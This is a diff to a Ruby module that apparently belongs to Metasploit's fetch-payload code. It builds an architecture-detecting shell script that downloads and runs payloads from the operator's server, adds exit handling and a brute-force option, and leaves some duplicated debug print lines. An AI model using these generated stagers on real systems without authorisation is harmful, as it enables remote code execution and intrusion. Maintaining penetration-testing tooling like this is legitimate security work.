@@ -11,12 +11,21 @@ module Msf
     script = 'archinfo=$(uname -m);'
     arch_payloads.each do |srv_entry|
       vprint_status("Adding #{srv_entry[:uri]} for #{srv_entry[:arch]}")
+      datastore['FETCH_FILENAME'] = srv_entry[:uri].dup
+      vprint_status(datastore['FETCH_FILENAME'])
+      vprint_status(datastore['FETCH_FILENAME'])
       os_arches(srv_entry[:arch]).each do |os_arch|
-        script << "if [ #{os_arch} = $archinfo ]; then (#{generate_fetch_commands(srv_entry[:uri])}); fi; "
-        # If I add an exit to this so that it leaves after launching, FETCH_FILELESS bash fails
+        # placing an exit after the conditionals causes 'FETCH_FILELESS to fail'
+        if datastore['FETCH_FILELESS'] == 'none'
+          script << "if [ #{os_arch} = $archinfo ]; then (#{generate_fetch_commands(srv_entry[:uri])}); exit ;fi; "
+        else
+          script << "if [ #{os_arch} = $archinfo ]; then (#{generate_fetch_commands(srv_entry[:uri])}); fi; "
+        end
       end
+      vprint_status(datastore['FETCH_FILENAME'])
     end
-    print_status(script)
+    script << _generate_bruteforce_multi_commands(arch_payloads) if datastore['FETCH_BRUTEFORCE']
+    vprint_status(script)
     script
   end
 
@@ -25,6 +34,8 @@ module Msf
     script = ''
     arch_payloads.each do |srv_entry|
       vprint_status("Adding #{srv_entry[:uri]} for #{srv_entry[:arch]}")
+      datastore['FETCH_FILENAME'] = srv_entry[:uri].dup
+      vprint_status(datastore['FETCH_FILENAME'])
       script << generate_fetch_commands(srv_entry[:uri]).to_s
     end
     print_status(script)
